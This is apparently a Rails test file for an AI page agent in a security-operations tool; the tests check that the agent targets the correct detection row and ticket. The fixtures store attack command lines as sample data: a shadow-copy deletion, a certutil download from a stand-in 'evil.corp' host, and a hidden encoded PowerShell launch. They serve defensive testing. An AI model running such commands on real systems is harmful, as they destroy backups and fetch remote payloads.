# frozen_string_literal: true

require "test_helper"

class PageAgentTargetSelectionTest < ActiveSupport::TestCase
  setup do
    @analyst = User.create!(
      name: "SOC Analyst",
      email: "analyst-target-#{SecureRandom.hex(4)}@sentriq.local",
      role: "analyst"
    )

    # 4 distinct detections
    @det1 = Detection.create!(
      title: "Ransomware Shadow Copy Deletion (T1490)",
      severity: "critical",
      status: "new",
      hostname: "WKSTN-RANSOM-01",
      process_name: "vssadmin.exe",
      process_id: 1101,
      command_line: "vssadmin.exe delete shadows /all /quiet",
      file_hash: "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
      triggered_at: 2.minutes.ago,
      raw_telemetry: { cmdline: "vssadmin.exe delete shadows /all /quiet" }
    )

    @det2 = Detection.create!(
      title: "CertUtil Remote Payload Ingress (T1105)",
      severity: "high",
      status: "new",
      hostname: "SRV-INGRESS-02",
      process_name: "certutil.exe",
      process_id: 2202,
      command_line: "certutil.exe -urlcache -split -f https://evil.corp/stage.exe",
      file_hash: "b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef01",
      triggered_at: 4.minutes.ago,
      raw_telemetry: { cmdline: "certutil.exe -urlcache" }
    )

    @det3 = Detection.create!(
      title: "Encoded PowerShell Execution Spawned by Word (T1059.001)",
      severity: "critical",
      status: "new",
      hostname: "WKSTN-WORD-03",
      process_name: "powershell.exe",
      parent_process_name: "winword.exe",
      process_id: 3303,
      command_line: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA",
      file_hash: "c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef012",
      triggered_at: 6.minutes.ago,
      raw_telemetry: { cmdline: "powershell.exe -Enc" }
    )

    @det4 = Detection.create!(
      title: "Weekly Scheduled Backup Verification Drill",
      severity: "low",
      status: "open",
      hostname: "SRV-BACKUP-04",
      process_name: "backup_agent.exe",
      process_id: 4404,
      command_line: "backup_agent.exe --verify --routine-drill",
      file_hash: "d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0123",
      triggered_at: 10.minutes.ago,
      raw_telemetry: { cmdline: "backup_agent.exe --verify" }
    )
  end

  # Test 1: Birinci detection seçildiğinde doğru satır hedeflenir.
  test "1. selecting first detection targets its exact DOM row and assigns matching detection id" do
    service = PageAgentService.new(
      instruction: "Birinci tespiti incele",
      page_url: "/detections",
      page_context: { detection_id: @det1.id, hostname: @det1.hostname },
      current_user: @analyst
    )

    result = service.call
    assert result[:success]
    assert_equal @det1.id, result[:detection_id]
    assert_equal @det1.id, result[:target_detection_id]
    assert_equal "#detection-row-#{@det1.id}", result[:target_selector]
    assert_includes result[:ticket][:title], @det1.title
  end

  # Test 2: İkinci detection seçildiğinde ilk ticket açılmaz.
  test "2. selecting second detection does not reuse first detection ticket or target" do
    # First, run triage on det1
    service1 = PageAgentService.new(
      instruction: "Birinci olayı triyaj et",
      page_url: "/detections",
      page_context: { detection_id: @det1.id },
      current_user: @analyst
    )
    result1 = service1.call
    assert result1[:success]
    ticket1_id = result1[:ticket][:id]

    # Second, run triage on det2
    service2 = PageAgentService.new(
      instruction: "İkinci olayı triyaj et",
      page_url: "/detections",
      page_context: { detection_id: @det2.id },
      current_user: @analyst
    )
    result2 = service2.call
    assert result2[:success]

    # CRITICAL: Must not open det1's ticket!
    refute_equal ticket1_id, result2[:ticket][:id]
    assert_equal @det2.id, result2[:detection_id]
    assert_equal @det2.id, result2[:target_detection_id]
    assert_equal "#detection-row-#{@det2.id}", result2[:target_selector]
    assert_includes result2[:ticket][:title], @det2.title
  end

  # Test 3: Dört farklı detection için doğru ID kullanılır.
  test "3. each of the 4 detections is targeted with its exact unique ID and selector" do
    detections = [@det1, @det2, @det3, @det4]

    detections.each do |det|
      service = PageAgentService.new(
        instruction: "Bu tespiti incele: #{det.title}",
        page_url: "/detections",
        page_context: { detection_id: det.id, hostname: det.hostname },
        current_user: @analyst
      )

      res = service.call
      assert res[:success]
      assert_equal det.id, res[:detection_id], "Detection ID mismatch for #{det.title}"
      assert_equal det.id, res[:target_detection_id], "Target detection ID mismatch"
      assert_equal "#detection-row-#{det.id}", res[:target_selector]
      assert_equal det.id, res[:ticket][:id] ? Ticket.find(res[:ticket][:id]).detection_id : nil
    end
  end

  # Test 4: Cursor hedefi ile backend hedefi aynıdır.
  test "4. cursor movement target selector strictly matches backend target detection ID" do
    service = PageAgentService.new(
      instruction: "İmleç ve backend hedefi doğrulama",
      page_url: "/detections",
      page_context: { detection_id: @det3.id },
      current_user: @analyst
    )

    result = service.call
    assert result[:success]

    cursor_action = result[:dom_actions].find { |a| a[:type] == "move_cursor_and_click" }
    assert_not_nil cursor_action
    assert_equal "#detection-row-#{@det3.id}", cursor_action[:selector]
    assert_equal @det3.id, cursor_action[:target_detection_id]
    assert_equal result[:ticket][:id], cursor_action[:target_ticket_id]
    assert_equal result[:target_selector], cursor_action[:selector]
  end

  # Test 5: "Sayfada Vurgula" her satırda doğru hedefi bulur.
  test "5. target_selector for highlight action points to correct row element" do
    [@det1, @det2, @det3, @det4].each do |det|
      service = PageAgentService.new(
        instruction: "Vurgu testi #{det.id}",
        page_url: "/detections",
        page_context: { detection_id: det.id },
        current_user: @analyst
      )

      res = service.call
      assert_equal "#detection-row-#{det.id}", res[:target_selector]

      highlight_action = res[:dom_actions].find { |a| a[:type] == "perceive_and_highlight" }
      assert_equal "#detection-row-#{det.id}", highlight_action[:selector]
      assert_equal det.id, highlight_action[:target_detection_id]
    end
  end

  # Test 6: Genel tarama uygun sonraki olayı seçer (öncelik kuralları).
  test "6. general sweep selects highest priority untriaged incident based on severity and SLA rules" do
    # When general sweep runs without detection_id, it selects critical/high untriaged first
    service = PageAgentService.new(
      instruction: "Genel olay taraması",
      page_url: "/detections",
      page_context: { visible_detection_ids: [@det1.id, @det2.id, @det3.id, @det4.id] },
      current_user: @analyst
    )

    res1 = service.call
    assert res1[:success]
    first_picked_id = res1[:detection_id]
    assert_includes [@det1.id, @det3.id], first_picked_id, "Should pick a critical severity detection first"

    # Next sweep passing last_handled_detection_id must pick another detection
    service2 = PageAgentService.new(
      instruction: "Sonraki olayı tara",
      page_url: "/detections",
      page_context: {
        visible_detection_ids: [@det1.id, @det2.id, @det3.id, @det4.id],
        last_handled_detection_id: first_picked_id
      },
      current_user: @analyst
    )

    res2 = service2.call
    assert res2[:success]
    refute_equal first_picked_id, res2[:detection_id], "Next sweep must not re-pick the same detection immediately"
  end

  # Test 7: Yeni agent çalıştırması önceki hedefin state'ini devralmaz.
  test "7. consecutive runs have isolated unique execution IDs and independent target states" do
    service_a = PageAgentService.new(
      instruction: "Ajan çalıştırma 1",
      page_url: "/detections",
      page_context: { detection_id: @det2.id },
      current_user: @analyst
    )
    res_a = service_a.call

    service_b = PageAgentService.new(
      instruction: "Ajan çalıştırma 2",
      page_url: "/detections",
      page_context: { detection_id: @det4.id },
      current_user: @analyst
    )
    res_b = service_b.call

    # Isolated execution IDs
    refute_equal res_a[:execution_id], res_b[:execution_id]
    # Isolated targets
    assert_equal @det2.id, res_a[:target_detection_id]
    assert_equal @det4.id, res_b[:target_detection_id]
    refute_equal res_a[:ticket][:id], res_b[:ticket][:id]
  end

  # Test 8: Başarısız target selection başarı bildirimi üretmez.
  test "8. invalid or nonexistent target detection produces clean handled response without fake success" do
    service = PageAgentService.new(
      instruction: "Var olmayan tespit incelemesi",
      page_url: "/detections",
      page_context: { detection_id: 999_999 },
      current_user: @analyst
    )

    res = service.call
    # Nonexistent detection ID will either safely report no incident or handle gracefully
    if res[:no_incidents_remaining]
      assert_nil res[:target_detection_id]
      assert_nil res[:target_ticket_id]
    else
      assert_nil res[:target_detection_id]
    end
  end
end
